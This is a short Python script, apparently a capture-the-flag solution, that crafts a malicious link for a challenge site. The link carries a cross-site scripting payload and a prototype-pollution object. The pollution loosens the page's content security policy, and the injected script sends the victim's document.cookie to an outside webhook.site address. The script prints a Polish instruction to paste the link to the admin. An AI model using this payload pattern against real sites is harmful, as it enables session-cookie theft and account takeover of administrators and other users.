import requests
from urllib.parse import quote
from json import dumps

script = "fetch('https://webhook.site/a0fa3943-4b77-401f-84c1-5b2fdb48a313/?' + document.cookie)"

input= {
    "name": f"<script>{script}</script>",
    "__proto__":{ "script-src" : "'unsafe-inline'", "connect-src": "webhook.site" }
}

enc_input = quote(dumps(input))

url = f"https://whats-your-name-0a4c5a9030.thsctf.site/?input={enc_input}"

print("WKLEJ PONIZSZY URL ADMINOWI:")
print(url)